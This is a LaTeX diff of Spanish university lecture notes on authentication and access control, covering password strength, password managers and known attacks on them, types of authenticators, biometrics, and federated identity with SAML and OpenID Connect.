+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{3.2cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+ & \textbf{Algoritmo mental} & \textbf{Cuatro palabras comunes aleatorias} \\
+\midrule
+\textbf{Construcción} & Palabra base poco común, sustituciones comunes, mayúsculas, un numeral y puntuación & Cuatro palabras comunes elegidas al azar \\
+\textbf{Entropía} & $\sim$28 bits & $\sim$44 bits \\
+\textbf{Tiempo} (a 1000 intentos/s) & $\sim$3 días & $\sim$550 años \\
+\textbf{Difícil de adivinar} & Fácil & Mucho \\
+\textbf{Difícil de recordar} & Mucho & Poco: ya te la sabes \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\begin{importante}[title={Moraleja de la viñeta}]
+Tras 20 años de esfuerzo, hemos entrenado a todo el mundo para usar contraseñas \textbf{difíciles de recordar para las personas}, pero \textbf{fáciles de adivinar para los ordenadores}.
+\end{importante}
+ 
+\section{Buenos verificadores}
+ 
+\begin{enumerate}
+  \item \textbf{Sin pistas de contraseña}: no proporcionar pistas que puedan ayudar a los atacantes a adivinar el secreto.
+  \item \textbf{Limitación de tasa} (\emph{rate limiting}): ralentizar o bloquear los intentos fallidos repetidos para prevenir la fuerza bruta.
+  \item \textbf{Permitir ``pegar''}: habilita el uso de gestores de contraseñas modernos.
+  \item \textbf{Opción de desenmascarado visible}: permitir ver la contraseña mientras se teclea, para reducir errores.
+  \item \textbf{Sin caducidad forzosa}: evitar imponer cambios periódicos de contraseña, que conducen a secretos más débiles.
+  \item \textbf{Hashing seguro con sal}: almacenar las contraseñas con sal y hasheadas usando un estándar con \textbf{factor de coste alto}.
+\end{enumerate}
+ 
+%=====================================================================
+\chapter{Gestores de contraseñas}
+%=====================================================================
+ 
+\section{¿Qué son?}
+ 
+\begin{definicion}{Gestor de contraseñas}
+Herramienta que permite a los usuarios gestionar y acceder a sus contraseñas. Almacena todas las contraseñas en una \textbf{base de datos} (BD) protegida con una \textbf{contraseña maestra}.
+\end{definicion}
+ 
+Para recuperar una contraseña (por ejemplo, para acceder a un servicio online), se teclea la contraseña maestra para desbloquear la BD. En muchos casos, el propio gestor \textbf{inicia la sesión por ti}.
+ 
+\section{Características}
+ 
+\subsection{Comunes}
+\begin{itemize}
+  \item Almacenamiento cifrado.
+  \item BD de contraseñas:
+    \begin{itemize}
+      \item Local vs.\ en la nube.
+      \item Sincronizada entre múltiples dispositivos.
+      \item Independiente (\emph{standalone}) vs.\ integrada (por ejemplo, en los navegadores).
+    \end{itemize}
+  \item Políticas de generación y caducidad de contraseñas.
+  \item MFA para desbloquearlo.
+\end{itemize}
+ 
+\subsection{Extra (para diferenciar el producto)}
+\begin{itemize}
+  \item \textbf{\emph{Vaults}} (cajas fuertes): almacenamiento de información sensible distinta de las contraseñas: documentos de identidad, tarjetas de crédito e información de pago, imágenes, documentos\ldots
+  \item Servicio de \textbf{alerta} al visitar sitios comprometidos.
+  \item \textbf{Compartición segura} de contraseñas con otra persona.
+  \item \textbf{Modo viaje}: elimina los datos sensibles de los dispositivos al cruzar fronteras y los restaura al volver.
+\end{itemize}
+ 
+\subsection{Ejemplos}
+1Password, LastPass, Bitwarden, Dashlane, Keeper. Las diapositivas muestran capturas de \textbf{Dashlane} (panel de análisis de contraseñas: cuentas totales, contraseñas débiles, comprometidas y reutilizadas) y de \textbf{1Password} (vista de la bóveda por categorías).
+ 
+\section{Valoración: ¿son buena idea?}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\centering\textbf{A favor (++)} & \centering\arraybackslash\textbf{En contra (-{}-)} \\
+\midrule
+\vspace{-0.5\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Pueden mejorar la seguridad y compensar las debilidades de tener demasiadas contraseñas.
+  \item Enormes beneficios de usabilidad en dispositivos con pantallas pequeñas y/o teclados multicapa (p.\,ej., smartphones).
+\end{itemize}\vspace{2pt}
+&
+\vspace{-0.5\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item \textbf{Seguridad}: son un \textbf{punto único de fallo} (\emph{single point of failure}). Y ¿son realmente seguros?
+  \item \textbf{Usabilidad}: ¿se integran de forma fluida?
+\end{itemize}\vspace{2pt} \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\section{Ataques a los gestores de contraseñas}
+ 
+\subsection{La nube}
+ 
+\begin{ejemplo}{Google Photos, \emph{Download your data} (aviso de febrero de 2020)}
+Por un fallo técnico, entre el 21 y el 25 de noviembre de 2019 algunos vídeos se exportaron por error a los archivos de \textbf{usuarios no relacionados}: una descarga podía estar incompleta y contener vídeos ajenos.
+\end{ejemplo}
+ 
+\begin{importante}
+``No existe la nube: es simplemente el \textbf{ordenador de otra persona}.''
+\end{importante}
+ 
+\subsection{Ataques tempranos: el ataque de autorrelleno (2014)}
+ 
+\begin{itemize}
+  \item Silver \emph{et al.}, \emph{Password Managers: Attacks and Defenses}, USENIX Security Symposium 2014 (USENIX es la asociación que nació como grupo de usuarios de UNIX).
+  \item El atacante extrae muchas (todas) las contraseñas de un gestor si el usuario se conecta a una \textbf{red WiFi maliciosa}.
+  \item Los \textbf{10 gestores populares} analizados resultaron \textbf{vulnerables}.
+  \item \textbf{Modelo de amenaza}: el \emph{Evil Coffee Shop Attacker} (el atacante de la cafetería), que tiene el \textbf{control temporal de un router o punto de acceso}.
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  % Líneas de vida
+  \node[caja, minimum width=3.2cm] (nav) at (0,0) {Navegador\\(con gestor)};
+  \node[caja, minimum width=3.2cm, fill=red!8, draw=red!60!black] (rt) at (8,0) {Router del atacante};
+  \draw[gray!60, dashed] (nav.south) -- ++(0,-6.4);
+  \draw[gray!60, dashed] (rt.south) -- ++(0,-6.4);
+  % Mensajes
+  \draw[flecha] (0,-1.1) -- node[etiq, above] {1. \texttt{GET papajohns.com}} (8,-1.1);
+  \draw[flecha] (8,-2.0) -- node[etiq, above] {2. \texttt{REDIRECT att.com}} (0,-2.0);
+  \draw[flecha] (0,-2.9) -- node[etiq, above] {3. \texttt{GET att.com}} (8,-2.9);
+  \draw[flecha, red!60!black] (8,-3.8) -- node[etiq, above] {4. Página de att.com + \textbf{JavaScript inyectado}} (0,-3.8);
+  \node[etiq, anchor=east, align=right, text=red!60!black] at (-0.2,-4.4) {Autorrelleno\\del gestor};
+  \draw[flecha, red!60!black] (0,-4.8) -- node[etiq, above] {5. El JS envía la contraseña de att.com: \textbf{robada}} (8,-4.8);
+  \draw[flecha] (0,-5.8) -- node[etiq, above] {6. \texttt{GET papajohns.com} (todo sigue normal)} (8,-5.8);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{enumerate}
+  \item El usuario solicita una web legítima (\texttt{GET papajohns.com}) a través del router controlado por el atacante.
+  \item El router responde con una redirección hacia el sitio objetivo del ataque (\texttt{REDIRECT att.com}).
+  \item El navegador pide \texttt{att.com}; el atacante \textbf{inyecta su propio JavaScript} en la respuesta.
+  \item El gestor \textbf{autorrellena} esa página y la contraseña de \texttt{att.com} queda robada.
+  \item La navegación continúa con normalidad (\texttt{GET papajohns.com}), sin que el usuario perciba nada.
+\end{enumerate}
+ 
+\begin{importante}[title={Consecuencias}]
+El autorrelleno es una de las \textbf{mejores funcionalidades de usabilidad} de los gestores, y una de las \textbf{más difíciles de implementar de forma segura}. Tras el ataque:
+\begin{itemize}
+  \item \textbf{LastPass} dejó de autorrellenar contraseñas en \emph{iframes} (\emph{inline frames}: páginas incrustadas dentro de otra).
+  \item \textbf{1Password} cambió su política para páginas HTTPS servidas sobre conexiones HTTP.
+\end{itemize}
+\end{importante}
+ 
+\subsection{Más ataques (2023)}
+Un fallo en \textbf{Bitwarden} podía permitir a los atacantes robar contraseñas usando \emph{iframes} (noticia de Bill Toulas, 8 de marzo de 2023).
+ 
+\subsection{Más ataques: la filtración de LastPass (2022)}
+ 
+\begin{ejemplo}{La brecha de LastPass}
+\begin{itemize}
+  \item En \textbf{diciembre de 2022}, LastPass reveló que una brecha de agosto, divulgada a finales de noviembre, fue peor de lo que pensaba: se comprometieron \textbf{copias cifradas de las bóvedas} de algunos usuarios, además de otra información personal.
+  \item Después reveló un \textbf{segundo incidente}, iniciado a mediados de agosto, que permitió a los atacantes moverse por el almacenamiento cloud de la empresa y \textbf{exfiltrar datos sensibles}, obteniendo privilegios muy elevados al atacar a un \textbf{empleado concreto}.
+  \item Los atacantes comprometieron el \textbf{ordenador doméstico de un ingeniero de DevOps} (\emph{Development + Operations}) explotando una vulnerabilidad de ejecución remota de código en un software multimedia de terceros, e implantaron un \textbf{keylogger}.
+  \item Así capturaron la \textbf{contraseña maestra} del empleado al teclearla, \textbf{después} de que se autenticase con MFA, y accedieron a la bóveda corporativa.
+  \item El software atacado era un \textbf{Plex Media Server} con un fallo \textbf{ya parcheado} tiempo atrás: la corrección se publicó en mayo de 2020, unas \textbf{75 versiones antes}, según Plex.
+\end{itemize}
+\end{ejemplo}
+ 
+%=====================================================================
+\chapter{Otros autenticadores}\label{cap:otros}
+%=====================================================================
+ 
+\section{Secretos de consulta (\emph{look-up secrets})}
+ 
+\begin{itemize}
+  \item Dispositivo físico o electrónico que almacena un \textbf{secreto compartido}.
+  \item Factor: \textbf{algo que tienes}.
+  \item Se usan comúnmente como ``\textbf{claves de recuperación}'' o como 2FA (\emph{Two-Factor Authentication}).
+  \item Ejemplo: \textbf{tarjeta de coordenadas} (\emph{grid card}), con filas numeradas y columnas con letras; el verificador pide el valor de ciertas casillas.
+  \item \textbf{Requisitos}:
+    \begin{itemize}
+      \item El contenido debe generarse con un RNG (\emph{Random Number Generator}) adecuado y cada secreto debe tener \textbf{al menos 20 bits de entropía}.
+      \item Cada secreto (p.\,ej., cada casilla de la tarjeta) debe usarse \textbf{una sola vez}.
+    \end{itemize}
+\end{itemize}
+ 
+\section{Dispositivos fuera de banda (\emph{out-of-band devices})}
+ 
+\begin{itemize}
+  \item \textbf{Poseídos y controlados} por el usuario.
+  \item Se comunican de forma segura con el verificador a través de un \textbf{canal distinto} (secundario).
+  \item Pueden operar de dos formas:
+    \begin{itemize}
+      \item Transferir al 1.\textsuperscript{er} canal un secreto recibido por el 2.\textsuperscript{º}.
+      \item Transferir al 2.\textsuperscript{º} canal un elemento observado en el 1.\textsuperscript{er}.
+    \end{itemize}
+  \item Resultan \textbf{limitados} si el segundo canal es la \textbf{PSTN} (\emph{Public Switched Telephone Network}, la red telefónica conmutada; p.\,ej., códigos por SMS).
+\end{itemize}
+ 
+\section{Dispositivo OTP de un solo factor}
+ 
+\begin{itemize}
+  \item OTP = \emph{One-Time Password} (contraseña de un solo uso).
+  \item Hardware o software con un \textbf{secreto compartido embebido}.
+  \item \textbf{No} requiere activación mediante otro secreto.
+  \item Muestra la OTP y el usuario la introduce manualmente en otro sitio.
+  \item Prueba la \textbf{posesión y el control} del dispositivo.
+  \item Similar a los secretos de consulta, pero los secretos se \textbf{generan criptográfica e independientemente por ambas partes}.
+  \item Las OTP se calculan a partir de un \emph{nonce} que puede ser \textbf{temporal} (\emph{time-based}), un \textbf{contador} o un \textbf{desafío} (\emph{challenge}).
+\end{itemize}
+ 
+\begin{ejemplo}{Token basado en tiempo (tipo RSA SecurID)}
+\begin{itemize}
+  \item $\text{PASSCODE} = \text{PIN} + \text{TOKENCODE}$
+  \item El \emph{token code} cambia cada \textbf{60 segundos}.
+  \item El dispositivo tiene un reloj sincronizado con UTC (\emph{Coordinated Universal Time}) y una \textbf{semilla única} (\emph{unique seed}).
+\end{itemize}
+RSA son las iniciales de Rivest, Shamir y Adleman, los creadores del algoritmo de clave pública que da nombre a la empresa.
+\end{ejemplo}
+ 
+\section{Dispositivo OTP multifactor}
+ 
+\begin{itemize}
+  \item Dispositivo OTP \textbf{bloqueado} que necesita desbloquearse mediante un factor adicional: \textbf{algo que sabes} o \textbf{algo que eres}.
+  \item Ejemplos: calculadoras-token con teclado y lectores de PIN de banca (p.\,ej., el de HSBC).
+\end{itemize}
+ 
+\section{Software criptográfico de un solo factor}
+ 
+\begin{itemize}
+  \item \textbf{Clave criptográfica} almacenada en disco o en algún soporte ``blando'' (\emph{soft media}).
+  \item La autenticación se logra \textbf{demostrando su posesión}.
+  \item Existen muchos protocolos, aunque generalmente consisten en algún \textbf{mensaje firmado sobre un \emph{nonce}} (\emph{number used once}).
+  \item Se guarda en un almacenamiento suficientemente seguro, p.\,ej., el \emph{keychain} o un \textbf{TPM} (\emph{Trusted Platform Module}) / \textbf{TEE} (\emph{Trusted Execution Environment}) si está disponible.
+    \begin{itemize}
+      \item En ese caso la clave queda guardada en hardware. Un concepto relacionado es el \textbf{HSM} (\emph{Hardware Security Module}), su equivalente dedicado y a mayor escala.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{ejemplo}{\emph{Passkey}}
+El dispositivo genera una clave pseudoaleatoria que queda protegida con tu huella o tu cara. Al autenticarte, la pantalla se pone en gris: la operación la gestiona el TPM.
+\end{ejemplo}
+ 
+\section{Dispositivo criptográfico de un solo factor}
+ 
+\begin{itemize}
+  \item Dispositivo con \textbf{claves criptográficas embebidas} para realizar operaciones criptográficas.
+  \item Proporciona directamente la salida del autenticador, a menudo un mensaje firmado sobre un \emph{nonce} proporcionado.
+  \item \textbf{No} requiere un segundo factor para activarse.
+  \item La clave \textbf{no debería ser exportable}.
+  \item Debería requerir \textbf{activación física} (p.\,ej., pulsar un botón).
+  \item Los dispositivos USB (\emph{Universal Serial Bus}) son habituales (p.\,ej., \textbf{YubiKey}).
+\end{itemize}
+ 
+\section{Software criptográfico multifactor}
+ 
+\begin{itemize}
+  \item Igual que el software criptográfico de un solo factor, pero el acceso a la clave requiere \textbf{activación mediante un segundo factor} (algo que sabes o algo que eres).
+  \item Prueba tanto la \textbf{posesión} como el \textbf{control} de la clave.
+\end{itemize}
+ 
+\section{Dispositivos criptográficos multifactor}
+ 
+\begin{itemize}
+  \item Igual que el dispositivo criptográfico de un solo factor, pero el acceso a la clave requiere \textbf{activación mediante un segundo factor} (algo que sabes o algo que eres).
+  \item Prueba tanto la \textbf{posesión del dispositivo} como el \textbf{control de la clave}.
+\end{itemize}
+ 
+\section{Biometría}
+ 
+\begin{definicion}{Biometría}
+Rasgos biológicos basados en alguna \textbf{característica física} del cuerpo humano o en \textbf{patrones de comportamiento} de la persona.
+\end{definicion}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\centering\textbf{Fisiológicos}\\\centering(características físicas) & \centering\arraybackslash\textbf{Conductuales}\\\centering\arraybackslash(\emph{behavioral}, cómo actúas) \\
+\midrule
+\vspace{-0.5\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Huella dactilar
+  \item Geometría de la mano
+  \item Retina e iris
+  \item Voz
+  \item Cara, cabeza
+  \item Vasos sanguíneos de la mano (patrón de venas)
+  \item \emph{Analprint}
+\end{itemize}\vspace{2pt}
+&
+\vspace{-0.5\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Escritura, firma
+  \item Movimiento de la mano
+  \item \textit{Uso}: en banca online, para detectar si quien maneja la sesión teclea o mueve el ratón como el titular.
+\end{itemize}\vspace{2pt} \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\subsection{¿Qué es un buen rasgo biométrico?}
+\begin{enumerate}
+  \item Toda persona debería tenerlo (\textbf{universalidad}).
+  \item Los individuos pueden distinguirse por él (\textbf{unicidad}).
+  \item Debería ser invariante en el tiempo (\textbf{permanencia}).
+  \item Su adquisición debería ser fácil (\textbf{recolectabilidad} o medibilidad).
+  \item Los usuarios no deberían tener objeciones a su uso (\textbf{aceptabilidad}).
+  \item La precisión y la velocidad de reconocimiento deben ser adecuadas (\textbf{rendimiento}).
+  \item Debería ser difícil de falsificar (\textbf{resistencia a la elusión}).
+\end{enumerate}
+ 
+\subsection{Inscripción (\emph{enrolment}) y comparación (\emph{match})}
+\begin{itemize}
+  \item Durante la \textbf{inscripción}, el algoritmo extrae un patrón (\textbf{plantilla}, \emph{template}) que representa una medición de la característica biométrica.
+  \item Durante la \textbf{autenticación}, se compara un conjunto actual de mediciones con la plantilla. Tiene éxito si ambos son ``\textbf{suficientemente parecidos}'' (\emph{close enough}).
+\end{itemize}
+ 
+\subsection{Ejemplos de modalidades}
+\begin{itemize}
+  \item \textbf{Huellas dactilares}: tipos de \textbf{minucias} (fin de cresta, \emph{enclosure}, bifurcación e isla) y patrones globales: \textbf{arco} (A), \textbf{arco en tienda} (T), \textbf{espiral o verticilo} (W, de \emph{whorl}) y \textbf{lazo} (U o R, de \emph{ulnar loop} y \emph{radial loop}, según el lado de la mano hacia el que se abre).
+  \item \textbf{Mano e iris}: lectores de geometría y de venas de la mano; imágenes de iris (quioscos de control fronterizo y dispositivos portátiles de captura).
+  \item \textbf{Cara / cabeza}: reconocimiento facial masivo, ilustrado con el estado de vigilancia en China (FT, \emph{Financial Times}: \emph{Inside China's surveillance state}) y una noticia de Ars Technica sobre el reconocimiento facial en vivo en Londres para localizar a personas buscadas. Vídeos citados:
+    \begin{itemize}
+      \item \url{https://www.youtube.com/watch?v=_yKga54tx6U}
+      \item \url{https://www.youtube.com/watch?v=uReVvICTrCM}
+      \item \url{https://www.youtube.com/watch?v=ectdRsyj-zI}
+    \end{itemize}
+\end{itemize}
+ 
+\section{Amenazas a los autenticadores}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}p{3.2cm} !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Factor} & \textbf{Amenazas} \\
+\midrule
+\textbf{Algo que sabes} & Puede ser divulgado, adivinado, observado o interceptado mientras se introduce, o revelado por el propio usuario mediante \emph{phishing} o ingeniería social. \\
+\textbf{Algo que tienes} & Puede ser perdido, dañado, robado o clonado. \\
+\textbf{Algo que eres} & Puede ser replicado. \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+%=====================================================================
+\chapter{Autenticación en sistemas distribuidos}
+%=====================================================================
+ 
+\section{Identidad federada}
+ 
+\begin{itemize}
+  \item \textbf{Unión} de sistemas de identificación y autenticación separados.
+  \item \textbf{Objetivo}: reducir la \textbf{fatiga del usuario} asociada a gestionar múltiples autenticadores.
+  \item Dos conceptos:
+    \begin{itemize}
+      \item \textbf{Sistema de identidad federada}: un perfil con un método de autenticación compartido por una federación de aplicaciones y sistemas.
+      \item \textbf{\emph{Single sign-on}} (SSO, inicio de sesión único): un único módulo de gestión de identidad reemplaza la identificación y la autenticación en todos los sistemas.
+    \end{itemize}
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[cajagris] (u) at (0,0) {Usuario};
+  \node[caja, minimum width=3.2cm] (sso) at (5.0,0) {\textbf{Shell de SSO}\\{\footnotesize custodia las credenciales}};
+  \node[cajagris] (a1) at (10.6,1.4) {Aplicación 1};
+  \node[cajagris] (a2) at (10.6,0) {Aplicación 2};
+  \node[cajagris] (a3) at (10.6,-1.4) {Aplicación 3};
+  \draw[flecha] (u) -- node[etiq, above=2pt] {se autentica\\una vez} (sso);
+  \draw[flecha] (sso.east) -- node[etiq, sloped, above] {contraseña} (a1.west);
+  \draw[flecha] (sso.east) -- node[etiq, above] {\emph{token}} (a2.west);
+  \draw[flecha] (sso.east) -- node[etiq, sloped, below] {etc.} (a3.west);
+\end{tikzpicture}
+\end{center}
+ 
+La shell de SSO custodia las credenciales de identificación y autenticación y se autentica ante cada aplicación por el medio que esta requiera, de modo que el usuario accede directamente a las aplicaciones.
+ 
+\section{Federaciones}
+ 
+\begin{itemize}
+  \item El \textbf{Subscriber} se comunica tanto con el \textbf{IdP} (\emph{Identity Provider}, proveedor de identidad) como con el \textbf{RP} (\emph{Relying Party}, parte confiante), a menudo a través de un navegador.
+  \item El IdP y el RP se comunican entre sí por el \textbf{\emph{front channel}} (canal frontal), usando redirecciones del suscriptor, o por el \textbf{\emph{back channel}} (canal trasero), directamente.
+  \item El IdP \textbf{afirma} (\emph{asserts}) los resultados de autenticación y los atributos de identidad.
+  \item Flujo: el Subscriber hace la \textbf{autenticación primaria} contra el IdP, se producen redirecciones, el IdP envía la información de identidad al RP y el RP gestiona la sesión. Puede haber múltiples suscriptores, IdP y RP.
+\end{itemize}
+ 
+\section{Aserciones (\emph{assertions})}
+ 
+\begin{definicion}{Aserción}
+Conjunto empaquetado de \textbf{atributos} asociados a un suscriptor autenticado, que se pasa \textbf{del IdP al RP}.
+\end{definicion}
+ 
+\begin{itemize}
+  \item Su uso principal es la \textbf{autenticación}, pero pueden servir para otros fines (p.\,ej., personalizar un sitio web).
+  \item \textbf{DEBEN} (\emph{SHALL}) incluir: sujeto, emisor, audiencia, emisión, expiración, identificador, firma y hora de autenticación.
+  \item \textbf{Pueden} incluir otros atributos: información sobre el suscriptor, el dispositivo, la ubicación, etc.
+  \item Se envían por \textbf{canales seguros y autenticados} y van protegidas: siempre \textbf{firmadas por el IdP} (PKC, \emph{Public-Key Cryptography}) o con \textbf{MAC} (\emph{Message Authentication Code}) mediante clave compartida.
+\end{itemize}
+ 
+\subsection{Presentación de aserciones: \emph{back channel}}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[cajagris] (sub) at (4,2.4) {Suscriptor};
+  \node[caja] (idp) at (0,0) {\textbf{IdP}};
+  \node[caja] (rp) at (8,0) {\textbf{RP}};
+  \draw[flecha] (idp) -- node[etiq, sloped, above] {1. Referencia (front)} (sub);
+  \draw[flecha] (sub) -- node[etiq, sloped, above] {2. Referencia (front)} (rp);
+  \draw[flecha, uc3m, transform canvas={yshift=4pt}] (rp) -- node[etiq, above=1pt] {3. Referencia (back)} (idp);
+  \draw[flecha, uc3m, transform canvas={yshift=-4pt}] (idp) -- node[etiq, below=1pt] {Aserción (back)} (rp);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{enumerate}
+  \item El IdP envía una \textbf{referencia de aserción} al suscriptor por el \emph{front channel}.
+  \item El suscriptor reenvía la referencia al RP por el \emph{front channel}.
+  \item El RP presenta la referencia al IdP por el \emph{back channel}; el IdP valida las credenciales y \textbf{devuelve la aserción}.
+\end{enumerate}
+ 
+\textbf{Características}:
+\begin{itemize}
+  \item \textbf{Más} transacciones de red.
+  \item Pero la información queda limitada \textbf{únicamente a las partes que la necesitan}.
+  \item El RP espera la aserción del IdP, por lo que la \textbf{superficie de ataque se reduce}.
+\end{itemize}
+ 
+\subsection{Presentación de aserciones: \emph{front channel}}
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[cajagris] (sub) at (4,2.4) {Suscriptor};
+  \node[caja] (idp) at (0,0) {\textbf{IdP}};
+  \node[caja] (rp) at (8,0) {\textbf{RP}};
+  \draw[flecha] (idp) -- node[etiq, sloped, above] {1. Aserción (front)} (sub);
+  \draw[flecha] (sub) -- node[etiq, sloped, above] {2. Aserción (front)} (rp);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{enumerate}
+  \item El IdP envía la \textbf{aserción} al suscriptor por el \emph{front channel}.
+  \item El suscriptor reenvía la aserción al RP por el \emph{front channel}.
+\end{enumerate}
+ 
+\textbf{Características}:
+\begin{itemize}
+  \item \textbf{Menos} transacciones de red.
+  \item Más difícil para el RP consultar al IdP atributos adicionales.
+  \item La aserción queda \textbf{bajo el control del suscriptor}: es visible para él, lo que podría provocar \textbf{fugas} (p.\,ej., perfilado de usuarios) si se redirige a partes no previstas, incluso si la audiencia está restringida.
+\end{itemize}
+ 
+\begin{importante}[title={En ambos casos, la aserción debe validarse}]
+\begin{multicols}{2}
+\begin{itemize}
+  \item Verificación del \textbf{emisor}.
+  \item Verificación de la \textbf{firma}.
+  \item Validación \textbf{temporal}.
+  \item Restricción de \textbf{audiencia}.
+\end{itemize}
+\end{multicols}
+\end{importante}
+ 
+\section{Ejemplo: SAML}
+ 
+\textbf{SAML} = \emph{Security Assertion Markup Language}.
+ 
+\begin{itemize}
+  \item Framework basado en \textbf{XML} (\emph{eXtensible Markup Language}) para crear e intercambiar información de autenticación y de atributos a través de Internet.
+  \item Tres componentes principales:
+    \begin{itemize}
+      \item El \textbf{esquema XML de aserciones}, que define la estructura de una aserción.
+      \item Los \textbf{protocolos SAML}, usados para solicitar aserciones y referencias de aserciones.
+      \item Los \textbf{\emph{bindings}}: protocolos de transporte subyacentes (p.\,ej., HTTP, \emph{HyperText Transfer Protocol}, o SOAP, \emph{Simple Object Access Protocol}).
+    \end{itemize}
+  \item Véase la página de SAML 2.0 en Wikipedia.
+\end{itemize}
+ 
+\section{Ejemplo: OpenID Connect (OIDC)}
+ 
+\begin{itemize}
+  \item Capa de autenticación construida sobre \textbf{OAuth 2.0} (\emph{Open Authorization}) y \textbf{JOSE} (\emph{JSON Object Signing and Encryption}; JSON = \emph{JavaScript Object Notation}).
+  \item El IdP emite:
+    \begin{itemize}
+      \item Un \textbf{ID Token} = aserción firmada en formato \textbf{JWT} (\emph{JSON Web Token}).
+      \item Un \textbf{\emph{access token}} estándar de OAuth, que puede usarse en el IdP para obtener un JSON con información completa sobre el usuario.
+    \end{itemize}
+  \item El RP interpreta (\emph{parsea}) el ID Token y usa el \emph{access token} de OAuth.
+\end{itemize}
+ 
+\section{Requisitos de privacidad}
+ 
+\begin{itemize}
+  \item La federación implica la \textbf{transferencia de atributos personales} desde un tercero (el IdP) que, por lo demás, no participa en la transacción. Esto da al IdP \textbf{visibilidad sobre las actividades} del suscriptor.
+  \item Los CSP a menudo tienen \textbf{fines de negocio distintos} de la provisión de identidad.
+  \item \emph{Back channel} $\Rightarrow$ revela al IdP \textbf{dónde} está realizando transacciones el suscriptor.
+  \item Múltiples RP $\Rightarrow$ \textbf{perfilado y rastreo} (\emph{profiling \& tracking}).
+  \item Existe un \textbf{compromiso} (\emph{trade-off}) con objetivos distintos de la verificación de identidad, como la mitigación del fraude o el cumplimiento de requerimientos legales.
+\end{itemize}
+ 
+\section{Lecturas adicionales: tendencias}
+ 
+\begin{itemize}
+  \item \textbf{Autenticación sin contraseña} (\emph{passwordless authentication}):
+    \begin{itemize}
+      \item Introducción: \url{https://auth0.com/blog/what-is-passwordless-authentication/}
+      \item FIDO (\emph{Fast IDentity Online}): \url{https://fidoalliance.org/fido2/}
+      \item Google Passkeys: \url{https://developers.google.com/identity/passkeys}
+      \item Apple Passkeys: \url{https://support.apple.com/en-us/102195}
+    \end{itemize}
+  \item \textbf{Autenticación continua} (\emph{continuous authentication}):
+    \begin{itemize}
+      \item \href{https://securityboulevard.com/2020/07/the-future-of-zero-trust-continuous-authentication/}{Security Boulevard (2020): \emph{The future of zero trust: continuous authentication}}
+    \end{itemize}
+\end{itemize}
+
+\part{Control de acceso}
+ 
+%=====================================================================
+\chapter{Control de acceso y políticas}
+%=====================================================================
+ 
+\begin{importante}[title={Sobre este tema}]
+Asignatura \textbf{Security Engineering / Ingeniería de Ciberseguridad} (UC3M). Transparencias de \textbf{Juan Tapiador}, con licencia CC BY (\emph{Creative Commons Attribution}: se pueden reutilizar citando al autor).
+\begin{enumerate}
+  \item Control de acceso y políticas.
+  \item Implementación en Linux: credenciales, el sistema de permisos, ACL POSIX, \emph{capabilities} y LSM (\emph{Linux Security Modules}).
+\end{enumerate}
+\end{importante}
+ 
+\section{Referencias}
+ 
+\begin{itemize}
+  \item \textbf{Fundamentos de seguridad en SSOO} (sistemas operativos): cualquier libro introductorio de SSOO tiene un capítulo de seguridad con los conceptos clave de autenticación y protección / control de acceso.
+  \item \textbf{\emph{Operating Systems: Three Easy Pieces}} (OSTEP), R. y A. Arpaci-Dusseau (versión online gratuita):
+    \begin{itemize}
+      \item Capítulo 53: introducción a la seguridad en SSOO.
+      \item Capítulo 54: autenticación.
+      \item Capítulo 55: control de acceso.
+    \end{itemize}
+  \item \textbf{Sistemas UNIX}: \emph{UNIX and Linux System Administration Handbook} (5.ª ed.), un recurso excelente para administradores. Capítulos relevantes:
+    \begin{itemize}
+      \item Cap.~3: \emph{Access Control and Rootly Powers}.
+      \item Cap.~5: \emph{The Filesystem} (cubre las ACL).
+      \item Cap.~8: \emph{User Management}.
+      \item Cap.~17: \emph{Single Sign-On}.
+      \item Cap.~24: \emph{Virtualization}.
+      \item Cap.~27: \emph{Security}.
+    \end{itemize}
+\end{itemize}
+ 
+\section{El problema de la protección}
+ 
+\begin{itemize}
+  \item ¿Cómo proteger objetos como \textbf{ficheros, tablas, dispositivos hardware, conexiones de red, objetos en memoria, procesos}, etc.?
+  \item ¿Qué significa ``protección''?
+\end{itemize}
+ 
+\begin{definicion}{Protección}
+La \textbf{separación de los procesos} de un sistema para \textbf{restringir el acceso a los recursos}.
+\end{definicion}
+ 
+\section{La base de la seguridad informática es el acceso controlado}
+ 
+Alguien está \textbf{autorizado} a realizar \textbf{alguna acción} sobre \textbf{algo}.
+ 
+\begin{definicion}{Control de acceso}
+El proceso de \textbf{limitar quién puede acceder a qué y de qué formas}.
+\end{definicion}
+ 
